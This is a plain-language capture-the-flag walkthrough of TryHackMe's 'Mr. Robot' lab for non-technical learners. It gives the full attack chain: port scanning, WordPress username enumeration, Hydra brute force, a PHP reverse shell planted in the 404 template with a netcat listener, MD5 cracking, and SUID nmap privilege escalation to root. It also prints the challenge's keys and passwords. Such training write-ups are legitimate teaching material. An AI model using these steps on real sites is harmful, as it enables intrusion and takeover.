# Mr. Robot CTF — Beginner's Step-by-Step Guide

> **What is this?**
> This is a guided walkthrough of a cybersecurity challenge called "Mr. Robot" on a training platform called TryHackMe. You are playing the role of an ethical hacker trying to find hidden "keys" inside a fake website. Everything is legal and contained inside TryHackMe's safe practice environment.
>
> **Who is this for?**
> Your study group members with no IT background. Every step explains **what you are doing** and **why you are doing it** in plain language.

---

## Before You Start — What You Need

| What | Where to get it |
|---|---|
| A TryHackMe account | https://tryhackme.com (free) |
| The Mr. Robot room started | Search "Mr Robot" on TryHackMe, click "Start Machine" |
| Kali Linux running | Your VM or the TryHackMe in-browser AttackBox |
| VPN connected | Download the `.ovpn` file from TryHackMe and connect |

> **What is Kali Linux?**
> Think of it as a special computer toolkit. Just like a plumber has a toolbox full of wrenches and pipes, Kali Linux is a toolbox full of cybersecurity tools. It looks like a normal computer but comes with hundreds of hacking and security testing programs pre-installed.

> **What is a VPN here?**
> TryHackMe's machines are on a private network — like a gated community. The VPN is the key that lets you drive your car (your Kali machine) into that gated community to reach the target machine.

---

## The Big Picture — What Are We Doing?

Imagine the target machine is a **locked house**. Inside the house are 3 hidden envelopes (keys). Our job is to:

1. **Knock on every door and window** — find out what the house has (reconnaissance)
2. **Find an unlocked door** — discover a weak point (enumeration)
3. **Walk in** — get access to the house (exploitation)
4. **Find a master key inside** — get higher-level access (privilege escalation)
5. **Collect all 3 envelopes** — find all 3 keys

---

## Phase 1 — Reconnaissance (Looking Around)

### Step 1.1 — Scan the Target

**Open your Kali terminal and type:**

```bash
nmap -Pn -sC -sV 10.49.164.182
```

> Replace `10.49.164.182` with the IP address shown on your TryHackMe room page.

**What is this doing?**
`nmap` is like a **building inspector walking around a house** checking every door and window. It sends little knocks to every possible entry point (called "ports") and reports back which ones are open, closed, or locked.

**Why are we doing this?**
Before you try to break into anything, you need to know what you're dealing with. You wouldn't try to pick a lock without first finding the door. This scan tells us: what services are running on this machine? A web server? An email server? SSH? Each open port is a potential way in.

**What you should see:**
```
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http   Apache (WordPress)
443/tcp open   https  Apache (WordPress)
```

**What this means in plain English:**
- Port 22 (SSH — remote control) = locked, we can't get in this way
- Port 80 (HTTP — normal website) = open! There's a website here
- Port 443 (HTTPS — secure website) = open! Same website but with encryption

---

### Step 1.2 — Check robots.txt

**In your terminal, type:**

```bash
curl http://10.49.164.182/robots.txt
```

**What is `robots.txt`?**
Every website has a file called `robots.txt` — it's like a **"staff notice board"** that tells Google's search bots which pages NOT to index. It's meant to be read by search engines, but anyone can read it. Hackers always check it because website owners sometimes accidentally list sensitive files here.

**Why are we doing this?**
Website owners sometimes list files they want hidden from Google but forget those files are still publicly accessible. It's like putting a sign saying "don't look in the back room" — which immediately makes everyone curious about the back room.

**What you should see:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**What this means:**
The website is telling search bots to ignore two files — but they're still accessible to us! We found a wordlist (`fsocity.dic`) and the first key is sitting right there.

---

### Step 1.3 — Grab Key 1

```bash
curl http://10.49.164.182/key-1-of-3.txt
```

**What you should see:**
```
073403c8a58a1f80d943455fb30724b9
```

**Congratulations — Key 1 found!** Copy this value and paste it into TryHackMe.

---

### Step 1.4 — Download the Wordlist

```bash
wget http://10.49.164.182/fsocity.dic -O fsocity.dic
```

**What is `fsocity.dic`?**
A dictionary file — a giant list of words. Think of it as a **phone book of passwords**. We'll use it later to guess the website's login password.

**Why download it?**
The website accidentally left its own password list publicly accessible. We'll use the target's own list against it — like a burglar finding the spare house key under the doormat.

---

### Step 1.5 — Clean Up the Wordlist

```bash
sort -u fsocity.dic > fsocity-uniq.dic
wc -l fsocity-uniq.dic
```

**What is this doing?**
The original file has 858,160 words — but most are duplicates. `sort -u` removes all duplicates, leaving only unique words. The result: **11,451 unique words**.

**Why are we doing this?**
Trying 858,160 passwords takes a very long time. Trying 11,451 takes a fraction of the time. We're being efficient — no need to try the same password twice.

---

## Phase 2 — Finding the Login (Enumeration)

### Step 2.1 — Identify the Website

Open a browser and go to `http://10.49.164.182`

You'll see a Mr. Robot themed interactive website. Try going to:
`http://10.49.164.182/wp-login.php`

**What is WordPress?**
WordPress is the most popular website-building platform in the world — like a pre-built shop that you customise. About 43% of all websites use it. Because it's so common, hackers know exactly where all the doors and windows are.

---

### Step 2.2 — Find the Username

```bash
curl -s -X POST http://10.49.164.182/wp-login.php \
  -d "log=elliot&pwd=wrongpassword" | grep -i "incorrect\|invalid"
```

**What are we doing?**
WordPress has a design flaw — it gives **different error messages** depending on whether the username exists or not.

- Wrong username → "Invalid username"
- Right username, wrong password → "The password you entered for the username **elliot** is incorrect"

**Why does this matter?**
This is like a security guard who says "there's no employee named John here" vs "John is here but you don't know his PIN." The second message confirms the name is correct. WordPress is telling us `elliot` is a valid account.

> **Username confirmed: `elliot`**

---

### Step 2.3 — Brute Force the Password

```bash
hydra -l elliot -P fsocity-uniq.dic 10.49.164.182 \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" \
  -t 30
```

**What is Hydra?**
Hydra is an **automated lock picker**. It tries thousands of passwords very quickly — one after another — until it finds the right one.

**What is `http-post-form`?**
When you click "Login" on a website, your browser sends a message to the server — that message is called a POST request. We're telling Hydra exactly how to format that message so it looks like a real login attempt.

**What does `^USER^` and `^PASS^` mean?**
These are placeholders. Hydra replaces `^USER^` with `elliot` and `^PASS^` with each word from our list, one by one.

**Why are we doing this?**
The website has no limit on how many times you can try to log in. Without that protection (called "rate limiting"), a program can try thousands of passwords per second. This is called a brute force attack.

**What you should see after a few minutes:**
```
[80][http-post-form] host: 10.49.164.182   login: elliot   password: ER28-0652
```

> **Credentials found: `elliot` / `ER28-0652`**

---

## Phase 3 — Getting Inside (Exploitation)

### Step 3.1 — Log Into WordPress

Go to `http://10.49.164.182/wp-login.php` in your browser.

Log in with:
- Username: `elliot`
- Password: `ER28-0652`

You're now inside the WordPress admin dashboard — like being behind the reception desk of the building.

---

### Step 3.2 — Prepare Your Reverse Shell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Open `shell.php` in a text editor and change these two lines:
- `$ip = '127.0.0.1';` → change to **your tun0 IP** (find it by running `ip a` and looking for the `tun0` line)
- `$port = 1234;` → change to `4444`

**What is a reverse shell?**
Normally you connect TO a computer. A reverse shell is the opposite — you make the **target computer call YOU**. Think of it like this: instead of knocking on someone's door, you trick them into knocking on your door. This works because firewalls often block incoming connections but allow outgoing ones.

**What is PHP?**
PHP is a programming language that websites use to run code on the server. WordPress runs on PHP. By injecting our PHP file into WordPress, we make the server run our code.

---

### Step 3.3 — Start Your Listener

Open a **second terminal** and type:

```bash
nc -lvnp 4444
```

**What is this?**
This is you **waiting by your phone for the call**. `nc` (Netcat) opens your computer on port 4444, waiting for the target machine to connect back to you.

- `-l` = Listen (wait for a connection)
- `-v` = Verbose (show details)
- `-n` = No DNS lookup
- `-p 4444` = On port 4444

Leave this terminal open and running.

---

### Step 3.4 — Inject the Shell via Theme Editor

In the WordPress dashboard:
1. Go to **Appearance → Editor** (in the left sidebar)
2. On the right side, click **404 Template (404.php)**
3. Select ALL the text in the editor and DELETE it
4. Paste in the entire contents of your `shell.php` file
5. Click **Update File**

**What are we doing?**
WordPress's Theme Editor lets administrators edit the PHP files that control how the website looks. The 404.php file is what WordPress shows when someone visits a page that doesn't exist. We're replacing it with our reverse shell code.

**Why the 404 page?**
Because we can trigger it easily by visiting any URL that doesn't exist on the website. As soon as the server runs the 404 page, it runs OUR code instead.

---

### Step 3.5 — Trigger the Shell

In your **first terminal**, type:

```bash
curl http://10.49.164.182/thispageisnotreal
```

**What is happening?**
You're asking the website for a page that doesn't exist. WordPress calls the 404.php file to handle this. But 404.php is now YOUR reverse shell — so the server runs your code, which makes it call back to your listener.

**Check your second terminal (the listener).** You should see:

```
connect to [YOUR IP] from 10.49.164.182
$ whoami
daemon
```

**You have a shell! You're now inside the server — as a user called `daemon`.**

> **What is `daemon`?**
> A low-privileged system user. Like being a janitor who got into the building — you're inside, but you can't access the executive offices yet.

---

### Step 3.6 — Stabilise the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Why?**
The shell you just got is basic — it doesn't behave like a normal terminal. These commands upgrade it to a proper interactive shell so you can use it comfortably (like upgrading from a walkie-talkie to a proper phone call).

---

## Phase 4 — Getting More Access (Privilege Escalation to `robot`)

### Step 4.1 — Look Around

```bash
ls -la /home/robot/
```

**What is `ls -la`?**
`ls` lists files in a folder. `-la` means "show all files including hidden ones, with details." It's like opening a filing cabinet and reading the labels on every folder.

**What you should see:**
```
-r-------- robot robot  key-2-of-3.txt
-rw-r--r-- robot robot  password.raw-md5
```

**Key 2 is here but we can't read it** — it's locked to the user `robot`. We need to become `robot` first.

But we CAN read `password.raw-md5`:

```bash
cat /home/robot/password.raw-md5
```

**Output:**
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**What is this?**
A password that has been converted into a scrambled code called a **hash**. `c3fcd3d76192e4007dfb496cca67e13b` is an MD5 hash. MD5 is an old, weak hashing method.

---

### Step 4.2 — Crack the Password Hash

**Option A — Easiest (Online):**
1. Go to https://crackstation.net in your browser
2. Paste `c3fcd3d76192e4007dfb496cca67e13b`
3. Click Crack

**Option B — Using Hashcat (in Kali):**
```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**What is password hashing?**
When you create a password on a website, the website doesn't store the actual password — that would be dangerous. Instead it stores a scrambled version (the hash). Think of it like a fingerprint: you can't reverse a fingerprint back into a finger, but you can compare fingerprints. MD5 is old and weak — hackers have pre-built tables of millions of common passwords and their MD5 hashes, so cracking it is instant for simple passwords.

**Result:**
```
c3fcd3d76192e4007dfb496cca67e13b → abcdefghijklmnopqrstuvwxyz
```

> **Password cracked: `abcdefghijklmnopqrstuvwxyz`**

Someone used the entire alphabet as their password. A terrible password — which is exactly why it cracked instantly.

---

### Step 4.3 — Switch to `robot`

```bash
su robot
```

Type the password when prompted: `abcdefghijklmnopqrstuvwxyz`

```bash
cat /home/robot/key-2-of-3.txt
```

**You found Key 2!**

---

## Phase 5 — Becoming the Most Powerful User (Privilege Escalation to root)

### Step 5.1 — Search for SUID Files

```bash
find / -perm -4000 -type f 2>/dev/null
```

**What is this command doing?**
This searches the entire computer (`/`) for files with a special permission flag called **SUID** set (`-perm -4000`).

**What is SUID?**
SUID stands for "Set User ID." When a file has this flag, it **runs as its owner** no matter who executes it. If a file owned by `root` has SUID set, anyone who runs it gets root-level powers for that program.

Think of it like a **master key hidden inside a filing cabinet**. Anyone who finds the filing cabinet can use the master key — regardless of who they are.

**What you should see:**
```
/usr/local/bin/nmap
```

This is unusual — `nmap` (our port scanner tool) has the SUID bit set and is owned by root. That means when we run it, it runs as root.

---

### Step 5.2 — Exploit nmap's Interactive Mode

```bash
nmap --interactive
```

You'll see a `nmap>` prompt. Now type:

```bash
!sh
```

**What just happened?**
Old versions of nmap (version 3.81, which is installed here) had an "interactive mode" that lets you run shell commands. Because nmap is running as root (due to SUID), any shell it opens is also running as root.

**Why `!sh`?**
In nmap's interactive mode, `!` means "run this as a shell command." `sh` opens a shell. So you're asking nmap to open a shell — and because nmap is running as root, the shell is a root shell.

**Verify:**
```bash
whoami
```

**Output:**
```
root
```

**You are now root — the most powerful user on the system. You control everything.**

---

### Step 5.3 — Grab the Final Key

```bash
cat /root/key-3-of-3.txt
```

**Key 3 found — all 3 keys collected! The machine is fully compromised.**

---

## Summary — What We Did and Why

| Phase | What We Did | Why It Worked |
|---|---|---|
| 1. Reconnaissance | Scanned all ports with nmap | Found the website running on port 80/443 |
| 2. Enumeration | Read robots.txt, downloaded wordlist | Website accidentally exposed its own password list |
| 3. Username discovery | Tested login with fake password | WordPress leaks whether usernames exist |
| 4. Brute force | Tried 11,451 passwords with Hydra | No login attempt limit — automated guessing worked |
| 5. Shell injection | Replaced WordPress 404 template with PHP reverse shell | Admins can edit PHP files — we abused that access |
| 6. Privilege escalation 1 | Cracked MD5 hash from readable file | MD5 is weak; simple password cracked instantly |
| 7. Privilege escalation 2 | Used SUID nmap's interactive mode | nmap ran as root due to misconfigured SUID bit |

---

## Glossary — Plain English Definitions

| Term | What it means |
|---|---|
| **Port** | A numbered doorway on a computer. Port 80 = website, Port 22 = remote control |
| **nmap** | A tool that checks which ports are open on a target computer |
| **WordPress** | A popular website builder platform used by millions of websites |
| **Brute force** | Trying every possible password until one works |
| **Hydra** | A tool that automates brute force attacks |
| **Reverse shell** | Making the target computer connect back to you |
| **Netcat (nc)** | A tool for opening and receiving network connections |
| **Hash / MD5** | A scrambled version of a password. MD5 is an old, weak type |
| **SUID** | A permission that makes a program run as its owner (if owner is root = dangerous) |
| **Root** | The most powerful user on a Linux system — like a building owner with master keys to everything |
| **Privilege escalation** | Going from a low-level user to a higher-level user |
| **daemon** | A background system user with limited permissions |

---

## Troubleshooting — When Things Go Wrong

| Problem | What to check |
|---|---|
| Shell doesn't connect back | Check that your tun0 IP in shell.php is correct. Run `ip a` to confirm |
| `su robot` says "must have a TTY" | Run `python -c 'import pty; pty.spawn("/bin/bash")'` first |
| nmap `--interactive` not available | Confirm version: `nmap --version` — must be 3.81 or older |
| Hydra takes too long | Make sure you used `fsocity-uniq.dic` (11k words) not the original (858k words) |
| Can't read key-2-of-3.txt | You must `su robot` first — key is only readable by the `robot` user |
